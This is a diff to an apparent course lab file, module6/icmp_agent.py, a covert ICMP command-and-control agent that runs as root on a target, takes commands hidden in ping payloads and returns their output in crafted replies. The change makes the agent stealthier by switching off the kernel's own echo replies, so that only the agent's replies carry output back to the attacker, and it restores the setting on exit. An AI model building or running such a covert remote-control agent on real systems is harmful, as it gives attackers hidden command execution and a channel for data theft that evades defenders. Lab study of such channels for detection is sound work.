@@ -9,6 +9,10 @@ The agent runs silently with no open ports — it looks like a machine
 responding to pings. Only observers watching ICMP payload contents
 would notice the covert channel.
 
+The agent temporarily sets icmp_echo_ignore_all=1 while running so its
+Scapy-crafted replies (carrying command output) are the only ones the
+attacker receives. Normal ping responses resume when the agent exits.
+
 Usage (run on the target VM as root):
   sudo python3 module6/icmp_agent.py --iface eth0
 
@@ -17,7 +21,9 @@ Usage (run on the target VM as root):
 """
 
 import argparse
+import signal
 import subprocess
+import sys
 import threading
 import time
 
@@ -166,9 +172,22 @@ def main():
     parser.add_argument("--iface", default=conf.iface)
     args = parser.parse_args()
 
+    # SIGTERM must also trigger the finally block (sys.exit raises SystemExit,
+    # which is caught by finally just like KeyboardInterrupt).
+    signal.signal(signal.SIGTERM, lambda sig, frame: sys.exit(0))
+
     print(f"[*] ICMP C2 Agent listening on {args.iface}")
     print("[*] Waiting for commands in ICMP echo request payloads...")
     print("[*] Press Ctrl-C to stop\n")
+
+    # Suppress the kernel's automatic echo-reply so the agent's Scapy-crafted
+    # reply (carrying command output) is the only one the attacker sees.
+    _IGNORE_PATH = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
+    with open(_IGNORE_PATH) as _f:
+        _saved = _f.read().strip()
+    with open(_IGNORE_PATH, "w") as _f:
+        _f.write("1\n")
+    print("[*] Kernel ICMP echo-reply suppressed (icmp_echo_ignore_all=1)")
 
     try:
         sniff(
@@ -179,6 +198,10 @@ def main():
         )
     except KeyboardInterrupt:
         print("\n[*] Agent stopped")
+    finally:
+        with open(_IGNORE_PATH, "w") as _f:
+            _f.write(_saved + "\n")
+        print(f"[*] Restored icmp_echo_ignore_all={_saved}")
 
 
 if __name__ == "__main__":
